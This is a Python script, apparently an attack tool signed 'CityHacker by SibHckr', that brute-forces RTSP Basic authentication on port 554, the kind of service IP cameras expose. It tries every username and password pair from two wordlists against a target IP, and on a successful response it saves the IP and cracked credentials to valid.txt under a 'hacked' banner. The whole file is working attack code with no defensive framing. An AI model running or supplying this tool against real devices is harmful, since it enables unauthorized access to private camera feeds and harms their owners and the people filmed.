#!/usr/local/bin/python3
import socket
import sys
import itertools
import base64
import argparse
import time
from threading import Thread

parser = argparse.ArgumentParser(add_help=True)

parser.add_argument('-u', '--usernames', help='Specify the wordlist of usernames (colon separated)[FILE]')
parser.add_argument('-P', '--passwords', help='Specify the wordlist of passwords (colon separated)[FILE]')
parser.add_argument('-ip', '--ip', help='ip adress')
args = parser.parse_args()

usernamesnpasswords = args.usernames, args.passwords
ip = args.ip
port = 554

def write(str, path):
    print("[CityHacker by SibHckr] ============= взломано, " + str + "")
    kekef = open(path, "a+")
    kekef.write(str + "\n")
    kekef.close()

lists = []
for u in usernamesnpasswords:
    words = []
    with open(u) as fp:
        for line in fp:
            words.append(line.rstrip())
    lists.append(words)
def b64Passwords(): 
    for element in itertools.product(*lists):
        passw = ":".join(element)
        passwToBytes = passw.encode('ascii')
        passwToB64 = base64.b64encode(passwToBytes)
        passwF = passwToB64.decode('ascii')

        def request():
            req = "DESCRIBE rtsp://"+ip+":"+ str(port)+" RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic "+str(passwF)+"\r\n\r\n"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            encodereq = req.encode('ascii')
            s.sendall(encodereq)
            data = s.recv(1024)
            response = data.decode('ascii')
            passwFDecoded = base64.b64decode(passwF.encode('ascii')).decode('ascii')
            print("Trying password " + str(passwFDecoded))
            if "404 Not Found" in response:
                pass
            elif "401" in response:
                pass
            elif "200" in response:
                write(ip + ":" + str(passwFDecoded), "valid.txt")
                #print("Base64 encoded password: "+passwF+"\nPassword: "+str(passwFDecoded)+"\r\n")
                exit()
            else:
                #print("[CityHacker by SibHckr] Error (unreachable host or timedout)")
                exit()
        request()
b64Passwords()
